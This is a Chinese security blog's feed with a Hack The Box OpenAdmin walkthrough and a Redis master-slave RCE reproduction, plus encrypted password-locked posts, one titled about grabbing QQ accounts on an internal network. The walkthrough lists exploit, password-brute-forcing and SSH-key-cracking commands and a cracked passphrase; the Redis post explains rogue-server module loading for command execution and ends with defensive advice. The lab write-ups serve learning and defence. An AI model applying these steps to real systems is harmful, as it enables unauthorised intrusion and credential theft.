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</div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Hack the box - OpenAdmin</title>
      <link href="/posts/6510a92e.html"/>
      <url>/posts/6510a92e.html</url>
      <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>菜的一批的自己正在尝试做HTB<br><img src="https://s2.ax1x.com/2020/01/22/1ACxB9.png" alt=""></p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>题目：<br><img src="https://s2.ax1x.com/2020/01/22/1APZBd.png" alt=""></p><p>开局nmap<br><img src="https://s2.ax1x.com/2020/01/22/1AP7bd.png" alt=""></p><p>打开80，apache默认页面<br><img src="https://s2.ax1x.com/2020/01/22/1APqUI.png" alt=""></p><p>Gobuster跑目录<br><img src="https://s2.ax1x.com/2020/01/22/1AiprQ.png" alt=""></p><p>/artwork目录啥也没有，纯静态玩意。我还找到了那套前端源码<br><img src="https://s2.ax1x.com/2020/01/22/1Aiian.png" alt=""></p><p>/music目录也是套前端的，但是点击login会跳到opennetadmin<br><img src="https://s2.ax1x.com/2020/01/22/1Ai8G6.png" alt=""></p><p>OpenNetAdmin<br><img src="https://s2.ax1x.com/2020/01/22/1AidZd.png" alt=""></p><p>发现右上角有个登录,弱口令登录上去看看<br><img src="https://s2.ax1x.com/2020/01/22/1AisRf.png" alt=""></p><p>观察了好一会没啥地方可以搞，Google搜了一下这玩意<br><img src="https://s2.ax1x.com/2020/01/22/1Ak6bQ.png" alt=""></p><p>searchsploit搜了一下exp，通过版本发现一个RCE<br><img src="https://s2.ax1x.com/2020/01/22/1Ak2Us.png" alt=""></p><p>exp复制到当前目录</p><pre><code>searchsploit -m 47691</code></pre><p>参数就一个URL，不知道填啥<br><img src="https://s2.ax1x.com/2020/01/22/1AAprD.png" alt=""></p><p>直接填OpenNetAdmin的路径上去不对头<br><img src="https://s2.ax1x.com/2020/01/22/1AAFIA.png" alt=""></p><p>找来msf的exp看了看，发现路径是/login.php<br><img src="https://s2.ax1x.com/2020/01/22/1AAlIs.png" alt=""></p><p>成功利用RCE<br><img src="https://s2.ax1x.com/2020/01/22/1AANsU.png" alt=""></p><p>先找当前数据库凭证<br><img src="https://s2.ax1x.com/2020/01/22/1AADiR.png" alt=""></p><p><img src="https://s2.ax1x.com/2020/01/22/1AAyz6.png" alt=""></p><p>尝试mysql连接，发现拒绝外连<br><img src="https://s2.ax1x.com/2020/01/22/1AAWee.png" alt=""></p><p>查询一下home目录，发现两个用户<br><img src="https://s2.ax1x.com/2020/01/22/1AA5FA.png" alt=""></p><p>拿mysql的密码用hydra去搞他<br><img src="https://s2.ax1x.com/2020/01/22/1AAjoj.png" alt=""></p><p>果然有搞头，登录上去康康<br><img src="https://s2.ax1x.com/2020/01/22/1AE9S0.png" alt=""></p><p>没user.txt，草<br><img src="https://s2.ax1x.com/2020/01/22/1AEPyT.png" alt=""></p><p>只能去搞那个用户了，寻找属于当前用户的文件</p><pre><code>find / -user jimmy</code></pre><p><img src="https://s2.ax1x.com/2020/01/22/1AER10.png" alt=""></p><p>喔直接就读取另外个用户的ssh密钥了<br><img src="https://s2.ax1x.com/2020/01/22/1AEHhR.png" alt=""></p><p>直接运行告诉我们权限不够，还有一段提示<br><img src="https://s2.ax1x.com/2020/01/22/1AEvnO.png" alt=""></p><p>WTF？忍者<br><img src="https://s2.ax1x.com/2020/01/22/1AEzHe.png" alt=""></p><p>你要的忍者<br><img src="https://timgsa.baidu.com/timg?image&amp;quality=80&amp;size=b9999_10000&amp;sec=1579682029630&amp;di=0457ab5522dfc50eee77b56d3f1574a1&amp;imgtype=0&amp;src=http%3A%2F%2Fdingyue.nosdn.127.net%2F4mEPPosWdLTN54CmwT6hZe9RPgDD8pfsj%3Dou6ki%3DFsXie1537279567510.jpg" alt=""></p><p>继续看index.php<br><img src="https://s2.ax1x.com/2020/01/22/1AVa59.md.png" alt=""></p><p>在最后几行发现个判断，不过有个锤子用。main.php的判断白给系列<br><img src="https://s2.ax1x.com/2020/01/22/1AVwCR.png" alt=""></p><p>根据第RCE拿到shell的时候，查看当前路径给的是</p><pre><code>/var/www/ona</code></pre><p>那么这个是不是另外个站点呢？为此我查看了apache.conf<br><img src="https://s2.ax1x.com/2020/01/22/1AZnsK.png" alt=""></p><p>根目录为/var/www/，但是另外一个目录访问404。那么就是多站点无疑了<br><img src="https://s2.ax1x.com/2020/01/22/1AZ3id.png" alt=""></p><p>参考链接：<a href="https://blog.csdn.net/jochen_M/article/details/84073588" target="_blank" rel="noopener">Ubuntu环境下利用Apache2部署多个站点_Jochen的博客-CSDN博客</a></p><p>进入到sites-available文件夹里看了看，发现两个配置文件。openadmin.conf对应OpenNetAdmin，那么另外一个是<br><img src="https://s2.ax1x.com/2020/01/22/1AZcQ0.png" alt=""></p><p>可以看到指向的web目录是</p><pre><code>/var/www/internal</code></pre><p>端口是52846，只允许127.0.0.1访问。那么尝试</p><pre><code>curl http://127.0.0.1:52846/main.php</code></pre><p><img src="https://s2.ax1x.com/2020/01/22/1AZqOK.md.png" alt=""></p><p>拿到id_rsa，保存到本地。尝试连接</p><pre><code>chmod 600 id_rsassh -i id_rsa joanna@10.10.10.171</code></pre><p>草尼玛，还要密码，畜生<br><img src="https://s2.ax1x.com/2020/01/22/1Aekm8.png" alt=""></p><p>转换成john可以爆破的格式，用john爆破</p><pre><code>python /usr/share/john/ssh2john.py sshid_rsa &gt; ssh.txtjohn --wordlist=/usr/share/wordlists/rockyou.txt</code></pre><p>最后得到的密码是bloodninjas<br><img src="https://s2.ax1x.com/2020/01/22/1AeyAe.png" alt=""><br>登录拿user.txt<br><img src="https://s2.ax1x.com/2020/01/22/1AeXj0.png" alt=""></p><p>sudo -l康康有啥能提权的<br><img src="https://s2.ax1x.com/2020/01/22/1Amkg1.png" alt=""></p><p>打开nano，Ctrl+R读取root.txt，嫖key<br><img src="https://s2.ax1x.com/2020/01/22/1AmnED.png" alt=""></p><p><img src="https://s2.ax1x.com/2020/01/22/1AmK4H.png" alt=""></p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Redis-RCE复现</title>
      <link href="/posts/ac34060e.html"/>
      <url>/posts/ac34060e.html</url>
      <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近有点沉迷于B站….草了狗。还是学习吧<br><img src="https://timgsa.baidu.com/timg?image&amp;quality=80&amp;size=b9999_10000&amp;sec=1579605325992&amp;di=f29b807ed67a97ea5df63dc2c8a366a0&amp;imgtype=0&amp;src=http%3A%2F%2Fb-ssl.duitang.com%2Fuploads%2Fblog%2F201508%2F25%2F20150825090550_vBntQ.jpeg" alt=""></p><h2 id="造成漏洞的原因"><a href="#造成漏洞的原因" class="headerlink" title="造成漏洞的原因"></a>造成漏洞的原因</h2><blockquote><p>通过主从复制 GetShell<br>在介绍这种利用方式之前，首先我们需要介绍一下什么是主从复制和redis的模块。<br>Redis主从复制<br>Redis是一个使用ANSI C编写的开源、支持网络、基于内存、可选持久性的键值对存储数据库。但如果当把数据存储在单个Redis的实例中，当读写体量比较大的时候，服务端就很难承受。为了应对这种情况，Redis就提供了主从模式，主从模式就是指使用一个redis实例作为主机，其他实例都作为备份机，其中主机和从机数据相同，而从机只负责读，主机只负责写，通过读写分离可以大幅度减轻流量的压力，算是一种通过牺牲空间来换取效率的缓解方式。</p></blockquote><h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><pre><code>apt install redis-server</code></pre><p>修改/etc/redis/redis.conf</p><pre><code>bind 127.0.0.1 -&gt; bind 0.0.0.0protected-mode -yes -&gt; protected-mode no</code></pre><p>exp地址：</p><pre><code>https://github.com/Ridter/redis-rce - 利用工具https://github.com/n0b0dyCN/redis-rogue-server/blob/master/exp.so - exp.so</code></pre><p><img src="https://s2.ax1x.com/2020/01/21/1kCbPf.png" alt=""></p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>那么实现shell的过程中实现了什么？先从py下手</p><pre><code>1.读取exp.so2.调用runserver函数处理  runserver(options.rhost, options.rport, options.lhost, options.lport) #目标IP、目标端口、attack IP、attack监听的端口（默认监听21000端口）3.调用Remote.do() #发送Redis密码验证，并返回结果，如果返回invalid password代表密码错误4.密码正确，redis登录成功后，发送info指令查看redis数据库详细信息5.发送SLAVEOF指令，指令格式 SLAVEOF host port。作用通过执行 SLAVEOF host port 命令，可以将当前服务器转变为指定服务器的从属服务器(slave server)，这里的host和port则指向attack的IP和端口6.发送CONFIG SET dbfilename &lt;name&gt; 设置文件名称(根据exp.so的文件名来设置的文件名，比如exp.so。设置的dbfilename就是exp)7.监听本机21000端口，等待redis回传的数据。根据返回的结果将exp转换成bytes，发送exp8.MODULE LOAD指令加载exp.so9.取消从属服务器10.根据选择是进入shell或者执行其他指令12.若是执行shell指令，则调用exp.so里面的system.exec函数后面跟上命令。system.exec &lt;command&gt;</code></pre><p>总的来说是，设置从属服务器后。在设置dbfilename，之后发送shellcode。应该是被Redis-Server保存了。然后加载扩展，调用system.exec函数执行命令。</p><h2 id="利用点"><a href="#利用点" class="headerlink" title="利用点"></a>利用点</h2><p>1.低权的时候，redis以root权限运行。通过RCE获得root权限<br>2.未授权直接利用</p><h2 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h2><p>1.设置本机才能访问<br>2.设置复杂性密码<br>3.Redis-server不以root权限运行</p>]]></content>
      
      
        <tags>
            
            <tag> 漏洞复现 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>内网抓取qq_hao</title>
      <link href="/posts/2e14ab0b.html"/>
      <url>/posts/2e14ab0b.html</url>
      <content type="html"><![CDATA[<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script><div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="Please enter the password to read the blog." />    <label for="pass">Please enter the password to read the blog.</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none">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